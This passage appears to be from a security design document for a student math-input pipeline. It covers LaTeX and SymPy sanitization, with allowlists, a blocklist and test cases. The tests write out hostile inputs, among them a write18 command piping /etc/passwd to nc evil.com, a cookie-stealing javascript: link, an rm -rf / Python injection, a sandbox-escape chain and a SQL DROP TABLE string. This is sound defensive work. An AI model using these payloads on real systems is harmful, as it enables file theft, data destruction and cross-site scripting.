
### 5.4 Timeout Enforcement at Every Stage

```
Stage 1: LaTeX sanitizer        -- <1ms (string scanning, no eval)
Stage 2: KaTeX render           -- <50ms typical, 500ms hard timeout
Stage 3: LaTeX-to-SymPy convert -- <10ms (string transformation)
Stage 4: AST validation         -- <1ms (tree walk)
Stage 5: SymPy evaluation       -- 5s hard timeout in subprocess
Stage 6: DB parameterized write -- standard query timeout (30s)
```

All timeouts are enforced by the caller, not by the callee. The SymPy subprocess is killed (`SIGKILL`) if it exceeds its timeout, preventing any in-process bypass.

---

## 6. Complete Allowlist: Safe Math Commands

The following LaTeX commands are permitted for student math input. This list covers K-12 through undergraduate mathematics.

### Symbols and Letters

| Category | Commands |
|----------|----------|
| Lowercase Greek | `\alpha` `\beta` `\gamma` `\delta` `\epsilon` `\varepsilon` `\zeta` `\eta` `\theta` `\vartheta` `\iota` `\kappa` `\lambda` `\mu` `\nu` `\xi` `\pi` `\varpi` `\rho` `\varrho` `\sigma` `\varsigma` `\tau` `\upsilon` `\phi` `\varphi` `\chi` `\psi` `\omega` |
| Uppercase Greek | `\Gamma` `\Delta` `\Theta` `\Lambda` `\Xi` `\Pi` `\Sigma` `\Upsilon` `\Phi` `\Psi` `\Omega` |
| Hebrew | `\aleph` `\beth` |
| Other | `\hbar` `\ell` `\wp` `\Re` `\Im` `\imath` `\jmath` `\infty` `\partial` `\nabla` |

### Operators and Relations

| Category | Commands |
|----------|----------|
| Binary ops | `\times` `\div` `\cdot` `\pm` `\mp` `\ast` `\star` `\circ` `\bullet` `\oplus` `\otimes` `\odot` |
| Relations | `\leq` `\geq` `\neq` `\approx` `\equiv` `\sim` `\simeq` `\cong` `\propto` `\parallel` `\perp` `\subset` `\supset` `\subseteq` `\supseteq` `\in` `\notin` `\ni` `\mid` |
| Logic | `\forall` `\exists` `\nexists` `\land` `\lor` `\lnot` `\neg` `\implies` `\iff` `\vee` `\wedge` |
| Set | `\cup` `\cap` `\setminus` `\emptyset` `\varnothing` |

### Structures

| Category | Commands |
|----------|----------|
| Fractions | `\frac` `\dfrac` `\tfrac` `\cfrac` |
| Roots | `\sqrt` |
| Big operators | `\sum` `\prod` `\coprod` `\int` `\iint` `\iiint` `\oint` |
| Limits | `\lim` `\limsup` `\liminf` `\max` `\min` `\sup` `\inf` |
| Functions | `\log` `\ln` `\lg` `\exp` `\sin` `\cos` `\tan` `\cot` `\sec` `\csc` `\arcsin` `\arccos` `\arctan` `\sinh` `\cosh` `\tanh` `\coth` `\det` `\dim` `\ker` `\hom` `\deg` `\gcd` `\arg` `\mod` `\bmod` `\pmod` `\operatorname` |
| Binomials | `\binom` `\dbinom` `\tbinom` |
| Matrices | `\begin{matrix}` `\begin{pmatrix}` `\begin{bmatrix}` `\begin{vmatrix}` `\begin{cases}` |
| Accents | `\hat` `\bar` `\vec` `\dot` `\ddot` `\tilde` `\widehat` `\widetilde` `\overline` `\underline` `\overbrace` `\underbrace` |

### Delimiters

| Category | Commands |
|----------|----------|
| Paired | `\left` `\right` `\langle` `\rangle` `\lfloor` `\rfloor` `\lceil` `\rceil` `\lvert` `\rvert` `\lVert` `\rVert` |
| Sizing | `\big` `\Big` `\bigg` `\Bigg` (and `l`/`r`/`m` variants) |

### Formatting and Spacing

| Category | Commands |
|----------|----------|
| Math fonts | `\mathbf` `\mathit` `\mathrm` `\mathsf` `\mathtt` `\mathcal` `\mathbb` `\mathfrak` `\mathscr` `\boldsymbol` |
| Text fonts | `\text` `\textbf` `\textit` `\textrm` |
| Spacing | `\quad` `\qquad` `\enspace` `\thinspace` |
| Styles | `\displaystyle` `\textstyle` `\scriptstyle` |
| Misc | `\phantom` `\boxed` `\cancel` `\not` `\color` `\textcolor` |

---

## 7. Complete Blocklist: Dangerous Commands

Every command not on the allowlist is blocked. The following are **explicitly** dangerous and are checked by the pattern-matching layer as defense in depth.

| Command | Risk | Severity |
|---------|------|----------|
| `\input{file}` | Reads arbitrary files from the filesystem | Critical |
| `\include{file}` | Same as `\input` with page breaks | Critical |
| `\write18{cmd}` | Runs shell commands (requires `--shell-escape`) | Critical |
| `\immediate\write18{cmd}` | Immediate shell execution | Critical |
| `\openin`, `\openout` | Opens files for reading/writing | Critical |
| `\newread`, `\newwrite` | Allocates file handles | High |
| `\read`, `\write` | Reads/writes file content | Critical |
| `\closein`, `\closeout` | Closes file handles | Low (but indicates I/O context) |
| `\catcode` | Changes character category codes to bypass filters | Critical |
| `\def`, `\edef`, `\gdef`, `\xdef` | Defines macros (can reconstruct blocked commands) | High |
| `\let` | Aliases one command to another | High |
| `\csname...\endcsname` | Constructs command names from strings (filter evasion) | High |
| `\expandafter` | Controls expansion order (evasion technique) | High |
| `\noexpand` | Suppresses expansion (evasion technique) | Medium |
| `\the` | Accesses internal TeX registers | Medium |
| `\meaning` | Reveals command definitions | Medium |
| `\loop...\repeat` | TeX-level loops (can cause infinite loops) | High |
| `\href{url}{text}` | Embeds clickable links (XSS via `javascript:`) | High |
| `\url{url}` | Embeds clickable URL (XSS via `javascript:`) | High |
| `\includegraphics{url}` | Loads external images (SSRF, tracking) | High |
| `\htmlClass`, `\htmlId`, `\htmlStyle`, `\htmlData` | Injects HTML attributes | High |
| `\usepackage{pkg}` | Loads arbitrary packages (expands attack surface) | High |
| `\documentclass` | Changes document class | Medium |
| `\lstinputlisting{file}` | Reads and displays file with syntax highlighting | Critical |
| `\verbatiminput{file}` | Reads and displays file verbatim | Critical |
| `\verb` | Verbatim mode (can contain unescaped characters) | Medium |

---

## 8. Test Cases

The following 15 injection attempts must be blocked by the sanitizer. Each test specifies the input, the attack vector it exercises, and the expected sanitizer behavior.

### Test 1: File Read via \input
```
Input:    "\input{/etc/passwd}"
Vector:   File inclusion (2.1)
Expected: BLOCKED -- "Disallowed command: \input",
          "Dangerous pattern: File inclusion command"
```

### Test 2: Shell Execution via \write18
```
Input:    "\immediate\write18{cat /etc/passwd | nc evil.com 4444}"
Vector:   Command execution (2.1)
Expected: BLOCKED -- "Disallowed command: \immediate",
          "Disallowed command: \write18",
          "Dangerous pattern: Shell execution command"
```

### Test 3: XSS via \href with JavaScript Protocol
```
Input:    "\href{javascript:document.location='https://evil.com/steal?c='+document.cookie}{Click}"
Vector:   XSS (2.2)
Expected: BLOCKED -- "Disallowed command: \href",
          "Dangerous pattern: URL/resource inclusion",
          "Dangerous pattern: JavaScript protocol in URL"
```

### Test 4: XSS via Mixed-Case Protocol (CVE-2024-28246)
```
Input:    "\href{JavaScript:alert(1)}{test}"
Vector:   Protocol bypass (2.2)
Expected: BLOCKED -- "Disallowed command: \href",
          "Dangerous pattern: JavaScript protocol in URL"
```

### Test 5: Category Code Bypass
```
Input:    "\catcode`\X=0 Xinput{/etc/passwd}"
Vector:   Filter evasion via catcode (2.1)
Expected: BLOCKED -- "Disallowed command: \catcode",
          "Dangerous pattern: Category code manipulation"
```

### Test 6: Macro-Based Command Reconstruction
```
Input:    "\def\a{inp}\def\b{ut}\csname\a\b\endcsname{/etc/passwd}"
Vector:   Filter evasion via macro (2.1)
Expected: BLOCKED -- "Disallowed command: \def",
          "Disallowed command: \csname",
          "Dangerous pattern: Macro definition command"
```

### Test 7: SymPy Code Execution via Python __import__
```
Input:    "__import__('os').system('rm -rf /')"
Vector:   Python eval injection (2.3)
Expected: BLOCKED by AST validator --
          "Dangerous pattern detected: __",
          "Dangerous pattern detected: import"
```

### Test 8: SymPy Object Model Traversal
```
Input:    "().__class__.__base__.__subclasses__()"
Vector:   Python sandbox escape (2.3)
Expected: BLOCKED by AST validator --
          "Dangerous pattern detected: __"
```

### Test 9: Exponential Macro Bomb (\edef)
```
Input:    "\edef\a{x}\edef\a{\a\a}...(repeated 20 times)...\a"
Vector:   DoS via token explosion (2.2, CVE-2024-28243)
Expected: BLOCKED -- "Disallowed command: \edef",
          "Dangerous pattern: Macro definition command",
          "Command count exceeds limit"
```

### Test 10: Deeply Nested Fractions (Stack Overflow)
```
Input:    "\frac{1}{\frac{1}{\frac{1}{...}}}" (22 levels deep)
Vector:   Stack overflow / DoS (2.5)
Expected: BLOCKED -- "Nesting depth 22 exceeds limit 20"
```

### Test 11: Unicode Superscript Bypass (CVE-2024-28244)
```
Input:    "x\u00B2\u00B3\u00B9"
Vector:   maxExpand bypass via Unicode (2.2)
Expected: BLOCKED --
          "Unicode sub/superscript characters blocked (CVE-2024-28244)"
```

### Test 12: SQL Injection via Stored LaTeX
```
Input:    "x^2 + 3'; DROP TABLE student_answers; --"
Vector:   SQL injection (2.6)
Expected: ALLOWED by LaTeX sanitizer (it is syntactically valid text),
          but SAFE because database layer uses parameterized queries.
          The sanitizer does not need to catch this -- the DB layer does.
```

### Test 13: Oversized Expression (Length Limit)
```
Input:    "x + " repeated 600 times (2400 chars)
Vector:   DoS via oversized input (2.5)
Expected: BLOCKED -- "Expression length 2400 exceeds limit 2000"
```

### Test 14: Null Byte Injection
```
Input:    "x^2\x00 + 1"
Vector:   String termination / DB corruption (2.6)
Expected: BLOCKED -- "Null bytes are not permitted"
```

### Test 15: Legitimate Complex Math (Should Pass)
```
Input:    "\int_{0}^{\infty} \frac{e^{-x^2}}{\sqrt{2\pi}} \, dx = \frac{1}{2}"
Vector:   None -- this is a valid Gaussian integral
Expected: ALLOWED -- safe: true, all commands on allowlist
```

---

## 9. Performance Impact

### Measured Overhead Per Stage

| Stage | Operation | Added Latency | Notes |
|-------|-----------|---------------|-------|
| LaTeX sanitizer (TS) | Regex + string scan | 0.1 - 0.5 ms | O(n) in input length, no backtracking risk |
| KaTeX render with hardened config | Same as normal + strict checks | ~0 ms additional | `strict: "error"` adds negligible overhead |
| LaTeX-to-Python conversion | String replacement | 0.1 - 0.3 ms | Simple `\frac` -> `Rational()` mapping |
| AST validation (Python) | `ast.parse` + tree walk | 0.2 - 0.8 ms | Proportional to expression complexity |
| Subprocess spawn (SymPy) | `multiprocessing.Process` | 50 - 150 ms | One-time cost; use process pool in production |
| SymPy evaluation | Expression-dependent | 10 - 5000 ms | Bounded by 5s timeout |
| Total sanitization overhead | All pre-eval checks | 0.4 - 1.6 ms | Negligible relative to SymPy evaluation time |

### Optimization: Process Pool

The 50-150ms subprocess spawn cost is eliminated by using a pre-warmed process pool:

```python
from concurrent.futures import ProcessPoolExecutor

# Create pool at application startup -- workers pre-import SymPy
sympy_pool = ProcessPoolExecutor(
    max_workers=4,
    initializer=_init_sympy_worker,
)

# Each evaluation reuses a warm worker -- no spawn overhead
future = sympy_pool.submit(safe_sympy_evaluate, expr_string, timeout_seconds=5)
result = future.result(timeout=6)  # 1s grace for IPC
```

With a process pool, total sanitization overhead is **under 2ms** for the typical case.

### Latency Budget

```
Total pipeline target:           <2000 ms
Gemini OCR (vision):             ~800 ms
LaTeX sanitization (all checks):    ~2 ms
KaTeX rendering:                   ~20 ms
SymPy CAS validation:            ~500 ms (typical), 5000 ms (max)
DB write:                          ~10 ms
Network overhead:                 ~100 ms
                                 ----------
Typical total:                   ~1432 ms  (within budget)
Worst case:                      ~5932 ms  (exceeds budget -- timeout fallback)
```

---

## 10. Security Score Contribution

This iteration contributes **18 points** to the cumulative Security Robustness Score (out of 100).

| Defense | Points | Rationale |
|---------|--------|-----------|
| LaTeX command allowlist parser | 5 | Primary defense: only safe commands pass through |
| AST-based SymPy validation | 4 | Prevents Python code execution via eval() |
| KaTeX hardened configuration | 3 | Eliminates XSS, macro bombs, and oversized elements |
| Expression complexity limits | 2 | Prevents DoS via nesting, length, and command count |
| Timeout enforcement (all stages) | 2 | Prevents indefinite hangs and resource exhaustion |
| Subprocess isolation for SymPy | 1 | Memory limits and process-level kill on timeout |
| Unicode sub/superscript blocking | 1 | Mitigates specific CVE-2024-28244 bypass |

**Cumulative score after iterations 01-03**: Iterations 01 (vision safety) + 02 (prompt injection) + 03 (LaTeX sanitization) = cumulative defense depth building toward 100.

### Scoring Methodology

Points are awarded for **defense-in-depth layers** that independently prevent exploitation. The allowlist parser earns the most because it is the single highest-value control -- if it works correctly, most attack vectors are neutralized before they reach any downstream consumer. The AST validator earns high points because it addresses the most critical risk (arbitrary Python execution). Lower-point items address specific CVEs or edge cases.

---

## 11. References

1. [PayloadsAllTheThings -- LaTeX Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/LaTeX%20Injection/) -- Comprehensive payload database
2. [Hacking with LaTeX (0day.work)](https://0day.work/hacking-with-latex/) -- Practical exploitation techniques
3. [Checkoway & Shacham, "Don't Take LaTeX Files from Strangers" (USENIX ;login: 2010)](https://www.usenix.org/system/files/login/articles/73506-checkoway.pdf) -- Foundational research on LaTeX as attack vector
4. [KaTeX Security Documentation](https://katex.org/docs/security) -- Official security guidance
5. [KaTeX Options Documentation](https://katex.org/docs/options.html) -- Configuration reference
6. [KaTeX Advisory GHSA-3wc5-fcw2-2329 (CVE-2024-28246)](https://github.com/KaTeX/KaTeX/security/advisories/GHSA-3wc5-fcw2-2329) -- Protocol bypass
7. [KaTeX Advisory GHSA-cvr6-37gx-v8wc (CVE-2024-28244)](https://github.com/KaTeX/KaTeX/security/advisories/GHSA-cvr6-37gx-v8wc) -- Unicode maxExpand bypass
8. [KaTeX Advisory GHSA-64fm-8hw2-v72w (CVE-2024-28243)](https://github.com/KaTeX/KaTeX/security/advisories/GHSA-64fm-8hw2-v72w) -- edef exponential blowup
9. [SymPy Issue #10805 -- sympify shouldn't use eval](https://github.com/sympy/sympy/issues/10805) -- Core vulnerability discussion
10. [SymPy PR #12524 -- Add safe flag to sympify()](https://github.com/sympy/sympy/pull/12524) -- Proposed mitigation (unmerged)
11. [SymPy Parsing Documentation](https://docs.sympy.org/latest/modules/parsing.html) -- parse_expr reference
12. [SymPy Issue #17609 -- Out of memory on big expressions](https://github.com/sympy/sympy/issues/17609) -- Memory exhaustion
13. [MathJax ReDoS (CVE-2023-39663)](https://security.snyk.io/vuln/SNYK-JS-MATHJAX-6210173) -- Regex denial of service
14. [CVE-2024-28246 Analysis (Ogma)](https://ogma.in/cve-2024-28246-understanding-the-katex-url-protocol-bypass-vulnerability-and-mitigation-steps) -- Detailed CVE walkthrough
15. [CVE-2024-45312 -- Overleaf path traversal](https://www.cvedetails.com/cve/CVE-2024-45312/) -- LaTeX in web application context
16. [AST-Based Python Code Restriction Analysis](https://www.codestudy.net/blog/restricting-python-s-syntax-to-execute-user-code-safely-is-this-a-safe-approach/) -- Security analysis of AST whitelisting
17. [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html) -- General input validation guidance
18. [OWASP ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) -- ReDoS attack patterns
19. [Practical CTF -- LaTeX](https://book.jorianwoltjer.com/languages/latex) -- CTF-oriented LaTeX exploitation

---

## Appendix A: Integration with Cena Pipeline

### Where the Sanitizer Runs

```
                     Student Photo
                          |
                    [Gemini 2.5 Flash OCR]
                          |
                     LaTeX string (UNTRUSTED)
                          |
                 +--------+--------+
                 |                 |
          [sanitizeLatex()]   (rejected? -> error response)
                 |
           sanitized LaTeX
                 |
         +-------+-------+
         |               |
   [KaTeX render]   [SymPy sidecar]
   (trust:false)    (AST validate -> subprocess eval)
         |               |
    HTML output      CAS result
         |               |
   [browser render]  [parameterized DB write]
```

### Database Storage

LaTeX strings are stored using parameterized queries exclusively:

```sql
-- SAFE: parameterized
INSERT INTO student_answers (student_id, latex_expression, cas_result)
VALUES ($1, $2, $3);
```

String interpolation into SQL is never used for LaTeX fields.

### Cena-Specific Considerations

1. **OCR as first filter**: Gemini 2.5 Flash is unlikely to produce shell commands from handwritten math photos. The OCR model acts as an unintentional first filter -- but it cannot be relied upon for security because adversarial images can influence OCR output.

2. **MathNet (in-process .NET CAS)**: MathNet uses a compiled parser, not `eval()`. It is inherently safer than SymPy but still benefits from input length and complexity limits to prevent DoS.

3. **NATS bus**: LaTeX strings transmitted on the NATS bus must be treated as untrusted at every consumer. The sanitizer runs at the API gateway, before the string enters the bus.

4. **Multi-tenancy**: The sanitizer is stateless and tenant-agnostic. No tenant-specific configuration is needed.

5. **COPPA/FERPA compliance**: The sanitizer does not log or store the input LaTeX string in any error path. Error messages contain only the category of violation, not the input itself, to avoid accidentally persisting student data in logs.
